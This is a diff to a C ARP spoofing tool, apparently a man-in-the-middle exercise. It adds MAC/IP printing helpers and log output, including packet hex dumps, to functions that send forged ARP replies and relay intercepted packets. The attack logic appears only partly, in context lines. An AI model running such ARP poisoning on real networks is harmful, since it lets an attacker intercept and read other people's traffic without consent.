@@ -1,5 +1,23 @@
 #include "arp.h"
 
+void print_mac(uint8_t *addr)
+{
+	for(int i = 0; i < 6; i++)
+	{
+		printf("%x", addr[i]);
+		if(i != 5) printf(":");
+	}
+}
+
+void print_ip(uint8_t *addr)
+{
+	for(int i = 0; i < 4; i++)
+	{
+		printf("%u", addr[i]);
+		if(i != 3) printf(".");
+	}
+}
+
 void get_my_mac(uint8_t *addr)
 {
 	struct ifreq ifr;
@@ -44,8 +62,10 @@ void get_my_mac(uint8_t *addr)
 			printf("error\n");
 		}
 	}
-	
-	if (success) memcpy(addr, ifr.ifr_hwaddr.sa_data, 6);	
+	if (success) memcpy(addr, ifr.ifr_hwaddr.sa_data, 6);
+	printf("[+] My MAC Address is ");
+	print_mac(addr);
+	printf("\n");
 }
 
 void get_my_ip(uint8_t *addr, char *interface) 
@@ -69,6 +89,9 @@ void get_my_ip(uint8_t *addr, char *interface)
     		memcpy(addr, (void*)&sin->sin_addr, sizeof(sin->sin_addr));
 		close(s);
   	}
+	printf("[+] My IP Address is ");
+	print_ip(addr);
+	printf("\n");
 }
 
 void make_arp(u_char *packet, uint8_t *src_mac, uint8_t *dst_mac, uint16_t op,
@@ -121,6 +144,10 @@ void get_mac_addr(uint8_t *ip_addr)
 			break;
 		}
 	}
+	print_ip(ip_addr);
+	printf(" is at ");
+	print_mac(ip2mac[*(uint32_t*)ip_addr]);
+	printf("\n");
 }
 
 void arp_infection(session s)
@@ -131,6 +158,17 @@ void arp_infection(session s)
 		 ARP_REPLY, my_mac, (uint8_t*)&s.tar_ip, 
 		 ip2mac[s.send_ip], (uint8_t*)&s.send_ip);
 	pcap_sendpacket(handle, send_pkt, ARP_PACKET_SIZE);
+
+	printf("[+] Attacked Session : ");
+	print_ip((uint8_t*)&s.send_ip);
+	printf("(");
+	print_mac(ip2mac[s.send_ip]);
+	printf(") -> ");
+	print_ip((uint8_t*)&s.tar_ip);
+	printf("(");
+	print_mac(ip2mac[s.tar_ip]);
+	printf(")\n");
+	printf("====================================\n");
 }
 
 void pkt_relay(const u_char *pkt, uint32_t len, session s)
@@ -140,5 +178,20 @@ void pkt_relay(const u_char *pkt, uint32_t len, session s)
 	memcpy(ethhdr->src_mac, my_mac, ADDR_LEN_MAC);
 	memcpy(ethhdr->dst_mac, ip2mac[s.tar_ip], ADDR_LEN_MAC);
 	pcap_sendpacket(handle, pkt, len);
+
+	printf("[+] Relayed Packet from ");
+	
+	print_mac(ip2mac[s.send_ip]);
+	printf(" to ");
+	print_mac(ip2mac[s.tar_ip]);
+	printf("\n");
+
+	for(int i = 0; i < 5; i++)
+	{
+		for(int j = 0; j < 16; j++)
+			printf("%02x ", pkt[i * 16 + j]);
+		printf("\n");
+	}
+	printf("====================================\n");
 }
 
